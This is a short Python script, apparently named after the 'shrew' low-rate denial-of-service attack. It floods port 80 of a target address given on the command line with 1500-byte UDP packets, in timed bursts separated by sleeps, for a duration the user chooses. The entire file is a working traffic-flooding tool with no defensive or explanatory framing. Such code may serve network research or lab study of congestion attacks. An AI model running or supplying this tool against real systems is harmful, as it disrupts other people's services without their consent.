#!/usr/bin/python

import socket
import sys
from time import time, sleep

""" Used http://www.binarytides.com/programming-udp-sockets-in-python/ """

def shrew():
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	except socket.error:
		print('Failed to create socket')
		sys.exit()
	start_time = time()
	addr = sys.argv[1]
	burst_period = float(sys.argv[2])
	burst_duration = float(sys.argv[3])
	total_time = float(sys.argv[4])
	msg = 'a' * 1500
	while True:
		# burst period
		start_burst_time = time()
		while True:
			s.sendto(msg, (addr, 80))
			burst_now = time()
			burst_delta = burst_now - start_burst_time
			if burst_delta >= burst_duration:
				break
		now = time()
		total_delta = now - start_time
		if total_delta > total_time:
			break
		
		# sleep for burst period in seconds
		sleep(burst_period)


if __name__ == "__main__":
	shrew()
